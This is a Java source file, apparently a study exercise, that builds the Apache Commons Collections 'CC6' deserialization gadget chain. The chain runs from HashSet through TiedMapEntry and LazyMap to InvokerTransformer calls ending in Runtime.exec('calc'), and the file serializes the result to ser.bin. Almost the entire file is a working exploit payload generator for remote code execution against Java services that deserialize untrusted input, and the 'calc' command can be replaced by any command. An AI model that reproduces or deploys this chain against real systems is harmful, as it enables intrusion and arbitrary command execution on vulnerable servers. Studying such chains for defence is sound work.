package org.CC.CC6;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

/**
 * Gadget chain:
 * 	    java.io.ObjectInputStream.readObject()
 *             java.util.HashSet.readObject()
 *                 java.util.HashMap.put()
 *                 java.util.HashMap.hash()
 *                     org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
 *                     org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
 *                         org.apache.commons.collections.map.LazyMap.get()
 *                             org.apache.commons.collections.functors.ChainedTransformer.transform()
 *                             org.apache.commons.collections.functors.InvokerTransformer.transform()
 *                             java.lang.reflect.Method.invoke()
 *                                 java.lang.Runtime.exec()
 */

public class CC6Test {
    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException {
        Transformer[] fake = new Transformer[]{
                new ConstantTransformer(1),
        };
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class}, new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class}, new Object[]{Runtime.class,null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(fake);
        Map<Object,Object> map = new HashMap<>();
        Map lazyMap = LazyMap.decorate(map, chainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"aaa");
        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put(tiedMapEntry, "bbb");
        HashSet<Object> set = new HashSet<>(1);
        set.add(tiedMapEntry);
        lazyMap.remove("aaa");
        //反射修改ChainedTransformer的值
        Field f = chainedTransformer.getClass().getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(chainedTransformer, transformers);
        serialize(set);
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
}
